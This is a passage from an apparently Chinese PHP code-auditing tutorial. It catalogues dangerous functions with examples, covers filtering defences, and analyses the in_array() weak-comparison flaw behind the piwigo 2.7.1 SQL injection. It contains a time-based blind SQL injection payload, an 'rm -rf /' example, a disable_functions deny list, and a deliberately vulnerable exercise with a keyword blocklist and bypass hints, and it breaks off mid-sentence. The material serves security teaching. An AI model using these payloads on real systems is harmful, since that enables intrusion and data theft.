(反引号)</td><td>执行命令并返回结果</td><td>$a&#x3D;<code>id</code>; print_r($a);</td></tr><tr><td>popen</td><td>执行命令并建立管道 返回一个指针 使用fread等函数操作指针进行读写</td><td>$a&#x3D;popen(“id”, “r”); echo fread($a, 2096);</td></tr><tr><td>proc_open</td><td>同 popen (进程控制功能更强大)</td><td>见PHP手册</td></tr><tr><td>pcntl_exec</td><td>执行命令 只返回是否发生错误</td><td>pcntl_exec(‘id’);</td></tr></tbody></table><h2 id="代码注入-文件包含"><a href="#代码注入-文件包含" class="headerlink" title="代码注入&#x2F;文件包含"></a>代码注入&#x2F;文件包含</h2><table><thead><tr><th>函数&#x2F;语法结构</th><th>描述</th><th>例子</th></tr></thead><tbody><tr><td>eval</td><td>将传入的参数内容作为PHP代码执行，eval不是函数，是一种语法结构，不能当做函数动态调用</td><td><code>eval(&#39;phpinfo();&#39;);</code></td></tr><tr><td>assert</td><td>将传入的参数内容作为PHP代码执行，PHP7以下是函数，PHP7及以上为语法结构</td><td><code>assert(&#39;phpinfo();&#39;);</code></td></tr><tr><td>preg_replace</td><td>当<code>preg_replace</code>使用&#x2F;e修饰符且原字符串可控时，有可能执行PHP代码</td><td><code>echo preg_replace(&quot;/e&quot;,&quot;&#123;$&#123;PHPINFO()&#125;&#125;&quot;,&quot;123&quot;);</code></td></tr><tr><td>call_user_func</td><td>把第一个参数作为回调函数调用，两个参数都完全可控时可利用，传入一个参数调用</td><td><code>call_user_func(&#39;assert&#39;, &#39;phpinfo();&#39;);</code></td></tr><tr><td>call_user_func_array</td><td>同<code>call_user_func</code>，可传入一个数组带入多个参数调用函数</td><td><code>call_user_func_array(&#39;file_put_contents&#39;, [&#39;1.txt&#39;,&#39;6666&#39;]);</code></td></tr><tr><td>create_function</td><td>根据传递的参数创建匿名函数，并返回唯一名称，利用时第二个参数可控</td><td><code>$f = create_function(&#39;&#39;,&#39;system($_GET[123]);&#39;); $f();</code></td></tr><tr><td>include</td><td>包含并运行指定文件，执行出错会抛出错误</td><td><code>include &#39;vars.php&#39;;</code> (括号可有可无)</td></tr><tr><td>require</td><td>同<code>include</code>，执行出错会抛出警告</td><td><code>require(&#39;somefile.php&#39;);</code> (括号可有可无)</td></tr><tr><td>require_once</td><td>同<code>require</code>，但会检查之前是否已经包含该文件，确保不重复包含</td><td></td></tr><tr><td>include_once</td><td>同<code>include</code>，但会检查之前是否已经包含该文件，确保不重复包含</td><td></td></tr></tbody></table><h2 id="SQL-LDAP注入"><a href="#SQL-LDAP注入" class="headerlink" title="SQL&#x2F;LDAP注入"></a>SQL&#x2F;LDAP注入</h2><table><thead><tr><th>函数&#x2F;方法</th><th>备注</th></tr></thead><tbody><tr><td><code>mysql_query</code></td><td></td></tr><tr><td><code>odbc_exec</code></td><td></td></tr><tr><td><code>mysqli_query</code></td><td></td></tr><tr><td><code>mysql_db_query</code></td><td></td></tr><tr><td><code>mysql_unbuffered_query</code></td><td></td></tr><tr><td><code>mysqli::query</code></td><td>用法示例：<code>$mysqli = new mysqli(&quot;localhost&quot;, &quot;my_user&quot;, &quot;my_password&quot;, &quot;world&quot;); $mysqli-&gt;query();</code></td></tr><tr><td><code>pg_query</code></td><td></td></tr><tr><td><code>pg_query_params</code></td><td></td></tr><tr><td><code>pg_send_query</code></td><td></td></tr><tr><td><code>pg_send_query_params</code></td><td></td></tr><tr><td><code>sqlsrv_query</code></td><td></td></tr><tr><td><code>pdo::query</code></td><td>用法示例：<code>$pdo = new PDO(&quot;mysql:host=localhost;dbname=phpdemo&quot;, &quot;root&quot;, &quot;1234&quot;); $pdo-&gt;query($sql);</code></td></tr><tr><td><code>SQLite3::query</code></td><td></td></tr><tr><td><code>SQLite3::exec</code></td><td>用法示例：<code>$db = new SQLite3(&#39;mysqlitedb.db&#39;); $db-&gt;query(&#39;SELECT bar FROM foo&#39;); $db-&gt;exec(&#39;CREATE TABLE bar (bar STRING)&#39;);</code></td></tr><tr><td><code>$mongo = new mongoclient(); $data = $coll-&gt;find($data);</code></td><td>参考：<a href="https://wooyun.js.org/drops/Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB.html">MongoDB注入攻击</a></td></tr><tr><td><code>$ld = ldap_connect(&quot;localhost&quot;); $lb = @ldap_bind($ld, &quot;cn=test,dc=test,dc=com&quot;, &quot;test&quot;);</code></td><td>参考：<a href="https://www.cnblogs.com/0nc3/p/12063436.html">LDAP注入攻击</a></td></tr><tr><td><code>Db::query</code></td><td>ThinkPHP框架</td></tr><tr><td><code>Db::execute</code></td><td>ThinkPHP框架</td></tr></tbody></table><h2 id="文件读取-SSRF"><a href="#文件读取-SSRF" class="headerlink" title="文件读取&#x2F;SSRF"></a>文件读取&#x2F;SSRF</h2><table><thead><tr><th>函数</th><th>描述</th><th>例子</th></tr></thead><tbody><tr><td><code>file_get_contents</code></td><td>读入文件并返回字符串</td><td><code>echo file_get_contents(&quot;flag.txt&quot;);</code> <br> <code>echo file_get_contents(&quot;https://www.bilibili.com/&quot;);</code></td></tr><tr><td><code>curl_setopt</code>, <code>curl_exec</code></td><td>Curl访问URL获取信息</td><td><code>function curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_exec($ch); curl_close($ch); &#125; $url = $_GET[&#39;url&#39;]; curl($url);</code></td></tr><tr><td><code>fsockopen</code></td><td>打开一个套接字连接（远程TCP&#x2F;UDP&#x2F;raw）</td><td><a href="https://www.php.net/manual/zh/function.fsockopen.php">fsockopen函数说明</a></td></tr><tr><td><code>readfile</code></td><td>读取文件并写入输出缓冲区</td><td>类似于<code>file_get_contents</code>，读取文件流</td></tr><tr><td><code>fopen</code>, <code>fread</code>, <code>fgets</code>, etc.</td><td>打开文件或URL并读取文件流</td><td><code>$file = fopen(&quot;test.txt&quot;,&quot;r&quot;); echo fread($file,&quot;1234&quot;); fclose($file);</code></td></tr><tr><td><code>file</code></td><td>将整个文件读入数组</td><td><code>echo implode(&#39;&#39;, file(&#39;https://www.bilibili.com/&#39;));</code></td></tr><tr><td><code>highlight_file</code>, <code>show_source</code></td><td>语法高亮显示文件内容</td><td><code>highlight_file(&quot;1.php&quot;);</code></td></tr><tr><td><code>parse_ini_file</code></td><td>读取并解析一个ini配置文件</td><td><code>print_r(parse_ini_file(&#39;1.ini&#39;));</code></td></tr><tr><td><code>simplexml_load_file</code></td><td>将文件读取并作为XML文档解析</td><td><code>simplexml_load_file(&#39;test.xml&#39;);</code></td></tr><tr><td><strong><code>stream_socket_client</code></strong></td><td>打开一个基于流的套接字连接，用于更灵活的网络通信</td><td><code>$fp = stream_socket_client(&quot;tcp://example.com:80&quot;, $errno, $errstr, 30);</code></td></tr><tr><td><strong><code>get_headers</code></strong></td><td>获取HTTP请求头信息</td><td><code>print_r(get_headers(&quot;https://www.example.com&quot;));</code></td></tr><tr><td><strong><code>file_put_contents</code></strong></td><td>将字符串写入文件</td><td><code>file_put_contents(&quot;test.txt&quot;, &quot;data to write&quot;);</code></td></tr><tr><td><strong><code>copy</code></strong></td><td>拷贝文件到另一个位置</td><td><code>copy(&quot;source.txt&quot;, &quot;destination.txt&quot;);</code></td></tr><tr><td><strong><code>move_uploaded_file</code></strong></td><td>将上传的文件移动到新位置</td><td><code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;upload_dir/&quot;.$_FILES[&#39;file&#39;][&#39;name&#39;]);</code></td></tr><tr><td><strong><code>parse_url</code></strong></td><td>解析URL并返回其组成部分</td><td><code>$url_components = parse_url(&quot;http://www.example.com/path?query=string&quot;);</code></td></tr><tr><td><strong><code>stream_context_create</code></strong></td><td>创建并设置流上下文用于文件或网络连接</td><td><code>$context = stream_context_create([&#39;http&#39; =&gt; [&#39;method&#39; =&gt; &#39;GET&#39;]]); file_get_contents(&quot;https://www.example.com&quot;, false, $context);</code></td></tr></tbody></table><p>补充：</p><ul><li>**<code>stream_socket_client</code>**：比<code>fsockopen</code>更加灵活，用于创建各种类型的网络连接（如TCP、UDP）。</li><li>**<code>get_headers</code>**：可以获取指定URL的HTTP响应头。</li><li>**<code>file_put_contents</code>**：可以写入文件，功能类似于<code>fopen</code>+<code>fwrite</code>，但更简便。</li><li>**<code>copy</code>**：可以直接将文件从一个路径复制到另一个路径。</li><li>**<code>move_uploaded_file</code>**：处理文件上传时使用，用于将临时文件移动到指定目录。</li><li>**<code>parse_url</code>**：用于解析URL，返回其组成部分，例如协议、主机名、路径等。</li><li>**<code>stream_context_create</code>**：用于为文件读取&#x2F;写入创建和设置流上下文，比如可以设置HTTP请求头。</li></ul><h2 id="文件上传-写入"><a href="#文件上传-写入" class="headerlink" title="文件上传&#x2F;写入"></a>文件上传&#x2F;写入</h2><table><thead><tr><th>函数&#x2F;方法</th><th>描述</th><th>例子</th></tr></thead><tbody><tr><td><code>file_put_contents</code></td><td>将一个字符串写入文件</td><td><code>file_put_contents(&quot;1.txt&quot;, &quot;6666&quot;);</code></td></tr><tr><td><code>move_uploaded_file</code></td><td>将上传的临时文件移动到新的位置</td><td><code>move_uploaded_file($_FILES[&quot;pictures&quot;][&quot;tmp_name&quot;], &quot;1.php&quot;);</code></td></tr><tr><td><code>rename</code></td><td>重命名文件&#x2F;目录</td><td><code>rename($oldname, $newname);</code></td></tr><tr><td><code>rmdir</code></td><td>删除目录</td><td><code>rmdir(&quot;directory_name&quot;);</code></td></tr><tr><td><code>mkdir</code></td><td>创建目录</td><td><code>mkdir(&quot;new_directory&quot;);</code></td></tr><tr><td><code>unlink</code></td><td>删除文件</td><td><code>unlink(&quot;file.txt&quot;);</code></td></tr><tr><td><code>copy</code></td><td>复制文件</td><td><code>copy(&quot;source.txt&quot;, &quot;destination.txt&quot;);</code></td></tr><tr><td><code>fopen</code>, <code>fputs</code>, <code>fwrite</code></td><td>打开文件或URL</td><td><a href="https://www.php.net/manual/zh/function.fwrite.php">fwrite官方文档</a></td></tr><tr><td><code>link</code></td><td>创建文件硬链接</td><td><code>link($target, $link);</code></td></tr><tr><td><code>symlink</code></td><td>创建符号链接（软链接）</td><td><code>symlink($target, $link);</code></td></tr><tr><td><code>tmpfile</code></td><td>创建一个临时文件（在临时目录存放，随机文件名，返回句柄）</td><td><code>$temp = tmpfile(); fwrite($temp, &quot;123456&quot;); fclose($temp);</code></td></tr><tr><td><code>request()-&gt;file()-&gt;move()</code></td><td>ThinkPHP文件上传</td><td><code>$file = request()-&gt;file($name); $file-&gt;move($filepath);</code></td></tr><tr><td><code>request()-&gt;file()-&gt;file()</code></td><td>ThinkPHP文件上传</td><td><code>$file = request()-&gt;file(&#39;upload&#39;);</code></td></tr><tr><td><code>extractTo</code></td><td>解压ZIP到目录</td><td><code>$zip-&gt;extractTo(&#39;path/to/extract&#39;);</code></td></tr><tr><td><code>DOMDocument loadXML simplexml_import_dom</code></td><td>加载解析XML，可能存在XXE漏洞，通过<code>file_get_contents</code>获取客户端输入并加载XML内容</td><td><code>&lt;?php $xmlfile = file_get_contents(&#39;php://input&#39;); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile); ?&gt;</code></td></tr><tr><td><code>simplexml_load_string</code></td><td>加载解析XML字符串，可能存在XXE漏洞</td><td><code>$xml = simplexml_load_string($_REQUEST[&#39;xml&#39;]); print_r($xml);</code></td></tr><tr><td><code>simplexml_load_file</code></td><td>读取文件并作为XML文档解析，可能存在XXE漏洞</td><td><code>simplexml_load_file(&#39;file.xml&#39;);</code></td></tr><tr><td><code>unserialize</code></td><td>反序列化对象</td><td><code>$data = unserialize($_POST[&#39;data&#39;]);</code></td></tr><tr><td><strong><code>fgetcsv</code></strong></td><td>读取并解析CSV格式的行</td><td><code>$handle = fopen(&quot;data.csv&quot;, &quot;r&quot;); while (($data = fgetcsv($handle)) !== FALSE) &#123; print_r($data); &#125; fclose($handle);</code></td></tr><tr><td><strong><code>file_exists</code></strong></td><td>检查文件或目录是否存在</td><td><code>if (file_exists(&quot;file.txt&quot;)) &#123; echo &quot;File exists&quot;; &#125;</code></td></tr><tr><td><strong><code>is_readable</code></strong></td><td>判断文件是否可读</td><td><code>if (is_readable(&quot;file.txt&quot;)) &#123; echo &quot;File is readable&quot;; &#125;</code></td></tr><tr><td><strong><code>is_writable</code></strong></td><td>判断文件是否可写</td><td><code>if (is_writable(&quot;file.txt&quot;)) &#123; echo &quot;File is writable&quot;; &#125;</code></td></tr><tr><td><strong><code>flock</code></strong></td><td>锁定文件防止并发读写</td><td><code>$fp = fopen(&quot;file.txt&quot;, &quot;r+&quot;); if (flock($fp, LOCK_EX)) &#123; fwrite($fp, &quot;Lock test&quot;); flock($fp, LOCK_UN); &#125; fclose($fp);</code></td></tr><tr><td><strong><code>readlink</code></strong></td><td>返回符号链接指向的目标</td><td><code>echo readlink(&quot;/path/to/symlink&quot;);</code></td></tr><tr><td><strong><code>realpath</code></strong></td><td>返回文件或目录的绝对路径</td><td><code>echo realpath(&quot;test.txt&quot;);</code></td></tr><tr><td><strong><code>chmod</code></strong></td><td>改变文件或目录的权限</td><td><code>chmod(&quot;file.txt&quot;, 0755);</code></td></tr><tr><td><strong><code>chown</code></strong></td><td>改变文件的所有者</td><td><code>chown(&quot;file.txt&quot;, &quot;username&quot;);</code></td></tr></tbody></table><h2 id="PHP原生过滤方法"><a href="#PHP原生过滤方法" class="headerlink" title="PHP原生过滤方法"></a>PHP原生过滤方法</h2><h3 id="1-命令注入防护"><a href="#1-命令注入防护" class="headerlink" title="1. 命令注入防护"></a>1. <strong>命令注入防护</strong></h3><ul><li><strong><code>escapeshellarg</code></strong><ul><li><strong>描述</strong>：将传入的参数添加单引号并转义原有的单引号，主要用于防止命令注入。处理后的字符串可安全地作为命令参数。</li><li><strong>例子</strong>：传入<code>id</code>后处理为<code>&#39;id&#39;</code>。如果传入<code>&#39;id #</code>，处理后为<code>&#39;\&#39;id #&#39;</code>，防止命令注入。</li><li><strong>用法</strong>：<code>escapeshellarg($arg);</code></li></ul></li><li><strong><code>escapeshellcmd</code></strong><ul><li><strong>描述</strong>：转义字符串中的特殊符号，用于防止命令注入。反斜线会在以下字符之前插入：<code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。’ 和 “ 仅在不配对时被转义。</li><li><strong>例子</strong>：<code>escapeshellcmd(&#39;ls; rm -rf /&#39;)</code>将转义命令中的特殊字符，避免命令注入。</li><li><strong>用法</strong>：<code>escapeshellcmd($cmd);</code></li></ul></li></ul><h3 id="2-SQL注入防护"><a href="#2-SQL注入防护" class="headerlink" title="2. SQL注入防护"></a>2. <strong>SQL注入防护</strong></h3><ul><li><strong><code>addslashes</code></strong><ul><li><strong>描述</strong>：在单引号（’）、双引号（”）、反斜线（\）与 NUL 前加上反斜线，用于防止SQL注入。</li><li><strong>例子</strong>：<code>addslashes(&quot;O&#39;Reilly&quot;)</code>返回<code>O\&#39;Reilly</code>，可以减少SQL注入风险。</li><li><strong>用法</strong>：<code>addslashes($input);</code></li></ul></li><li><strong><code>mysqli::real_escape_string</code> &#x2F; <code>mysqli_real_escape_string</code></strong><ul><li><strong>描述</strong>：这些函数在 NULL (<code>\x00</code>), 换行符 (<code>\n</code>), 回车符 (<code>\r</code>), 空格字符 (<code>\x1a</code>), 单引号 (<code>&#39;</code>), 双引号 (<code>&quot;</code>) 和反斜线 (<code>\</code>) 前加上反斜线，并考虑到当前数据库连接的字符集。用于防止SQL注入。</li><li><strong>注意</strong>：处理后的字符串需要使用引号包裹后拼接到SQL语句中，否则仍可导致SQL注入。</li><li><strong>例子</strong>：<code>$conn-&gt;real_escape_string($input);</code></li></ul></li><li><strong><code>PDO::quote</code></strong><ul><li><strong>描述</strong>：将字符串中的特殊字符进行转义，并为字符串添加引号。适用于防止SQL注入。</li><li><strong>例子</strong>：<code>$pdo-&gt;quote(&quot;O&#39;Reilly&quot;);</code> 返回 <code>&#39;O\&#39;Reilly&#39;</code></li><li><strong>用法</strong>：<code>$pdo-&gt;quote($input);</code></li></ul></li><li><strong><code>PDO::prepare</code></strong><ul><li><strong>描述</strong>：预处理SQL语句，确保参数传递时不会破坏SQL语句的结构，是防止SQL注入的最佳实践。</li><li><strong>例子</strong>：<code>$stmt = $pdo-&gt;prepare(&#39;SELECT * FROM users WHERE id = :id&#39;);</code></li><li><strong>用法</strong>：<code>$stmt-&gt;execute([&#39;:id&#39; =&gt; $id]);</code></li></ul></li></ul><h3 id="3-XSS防护"><a href="#3-XSS防护" class="headerlink" title="3. XSS防护"></a>3. <strong>XSS防护</strong></h3><ul><li><strong><code>htmlspecialchars</code></strong><ul><li><strong>描述</strong>：将特殊字符（如 <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>&#39;</code>, <code>&quot;</code>）转义为HTML实体，防止恶意脚本通过HTML注入XSS攻击。</li><li><strong>例子</strong>：<code>htmlspecialchars(&#39;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;)</code> 将输出 <code>&amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/script&amp;gt;</code></li><li><strong>用法</strong>：<code>htmlspecialchars($input, ENT_QUOTES, &#39;UTF-8&#39;);</code></li></ul></li><li><strong><code>htmlentities</code></strong><ul><li><strong>描述</strong>：将所有的适合的字符转义为HTML实体，与<code>htmlspecialchars</code>类似，但更加严格。</li><li><strong>例子</strong>：<code>htmlentities(&#39;&lt;b&gt;bold&lt;/b&gt;&#39;)</code> 返回 <code>&amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt;</code></li><li><strong>用法</strong>：<code>htmlentities($input, ENT_QUOTES, &#39;UTF-8&#39;);</code></li></ul></li></ul><h3 id="4-数字类型过滤"><a href="#4-数字类型过滤" class="headerlink" title="4. 数字类型过滤"></a>4. <strong>数字类型过滤</strong></h3><ul><li><strong><code>intval</code> &#x2F; <code>floatval</code> &#x2F; <code>(int)</code> &#x2F; <code>num+0</code></strong><ul><li><strong>描述</strong>：将输入强制转换为整数或浮点数。通常用于确保输入为数字，防止SQL注入或逻辑漏洞。</li><li><strong>例子</strong>：<ul><li><code>intval(&#39;42abc&#39;)</code> 返回 <code>42</code></li><li><code>floatval(&#39;42.42abc&#39;)</code> 返回 <code>42.42</code></li><li><code>(int) &#39;123abc&#39;</code> 返回 <code>123</code></li></ul></li><li><strong>用法</strong>：<code>intval($input);</code> 或 <code>(int)$input;</code></li></ul></li></ul><h3 id="5-其他防护配置项"><a href="#5-其他防护配置项" class="headerlink" title="5. 其他防护配置项"></a>5. <strong>其他防护配置项</strong></h3><ul><li><strong>配置防止命令注入</strong>：<ul><li><strong>禁用危险函数</strong>：通过PHP的配置文件<code>php.ini</code>，可以禁用危险函数如<code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>等。</li><li><strong>配置</strong>：<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">disable_functions</span> = <span class="string">&quot;exec, passthru, shell_exec, system, proc_open, popen, curl_exec&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>限制文件操作</strong>：可以通过<code>open_basedir</code>限制PHP对特定目录的访问，防止通过路径注入或文件包含漏洞来执行恶意文件。</li><li><strong>配置</strong>：<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">open_basedir</span> = <span class="string">&quot;/var/www/html:/tmp&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="in-array-缺陷"><a href="#in-array-缺陷" class="headerlink" title="in_array() 缺陷"></a>in_array() 缺陷</h2><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image.png"><br>分析上面的代码流程，是一个文件上传的接口，但是对文件名有白名单，利用了<code>in_array()</code>方法，这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">in_array ：(PHP 4, PHP 5, PHP 7)</span><br><span class="line">功能 ：检查数组中是否存在某个值</span><br><span class="line">定义 ： bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</span><br><span class="line">在 $haystack 中搜索 $needle ，如果第三个参数 $strict 的值为 TRUE ，则 in_array() 函数会进行强检查，检查 $needle 的类型是否和 $haystack 中的相同。如果找到 $haystack ，则返回 TRUE，否则返回 FALSE。</span><br></pre></td></tr></table></figure><p>由于该函数并未将第三个参数设置为 true ，这导致攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 7shell.php 。因为PHP在使用 in_array() 函数判断时，会将 7shell.php 强制转换成数字7，而数字7在 range(1,24) 数组中，最终绕过 in_array() 函数判断，导致任意文件上传漏洞。（这里之所以会发生强制类型转换，是因为目标数组中的元素为数字类型）我们来看看PHP手册对 in_array() 函数的定义。</p><h3 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h3><p>下面看一个具体的真实案例：piwigo2.7.1 版本。该版本由于SQL语句直接拼接 $rate 变量，而 $rate 变量也仅是用 in_array() 函数简单处理，并未使用第三个参数进行严格匹配，最终导致sql注入漏洞发生。下面我们来看看具体的漏洞位置。漏洞的入口文件在<code>picture.php</code>文件中，<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-1.png"><br>当 <code>$_GET[&#39;action&#39;]</code> 为 rate 的时候，就会调用文件 include&#x2F;functions_rate.inc.php 中的 rate_picture 方法，而漏洞便存在这个方法中。我们可以看到下图第23行处直接拼接 $rate 变量，而在第2行使用 in_array() 函数对 $rate 变量进行检测，判断 $rate 是否在 <code>$conf[&#39;rate_items&#39;]</code> 中， <code>$conf[&#39;rate_items&#39;]</code> 的内容可以在 include\config_default.inc.php 中找到，为 <code>$conf[&#39;rate_items&#39;] = array(0,1,2,3,4,5)</code>;<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-2.png"><br>由于这里（上图第6行）并没有将 in_array() 函数的第三个参数设置为 true ，所以会进行弱比较，可以绕过。比如我们将 $rate 的值设置成 <code>1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#</code> 那么SQL语句就变成：<br><code>INSERT INTO piwigo_rate (user_id,anonymous_id,element_id,rate,date) VALUES (2,&#39;192.168.2&#39;,1,1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#,NOW()) ;</code><br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-3.png" alt="流程可以简化为此图"><br>可以看到这个漏洞的原因是弱类型比较问题，那么我们就可以使用强匹配进行修复。例如将 in_array() 函数的第三个参数设置为 true ，或者使用 intval() 函数将变量强转成数字，又或者使用正则匹配来处理变量。这里我将 in_array() 函数的第三个参数设置为 true ，代码及防护效果如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-4.png"></p><h3 id="作业题目"><a href="#作业题目" class="headerlink" title="作业题目"></a>作业题目</h3><p>审计下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT COUNT(*) FROM users&quot;</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="variable">$row</span>[<span class="string">&#x27;COUNT(*)&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">stop_hack</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$id</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;id <span class="subst">$id</span> is not in whitelist.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&lt;center&gt;<span class="subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$conn</span>-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;day1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;</span><br><span class="line"><span class="variable">$back_list</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$back_list</span> <span class="keyword">as</span> <span class="variable">$hack</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$hack</span>/i&quot;</span>, <span class="variable">$value</span>))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$hack</span> detected!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题目可以看出，首先需要绕过in_array之后由于sql语句过滤，需要考虑绕过。前者加个数字就好，后者可以用 updatexml 注入。当 updatexml 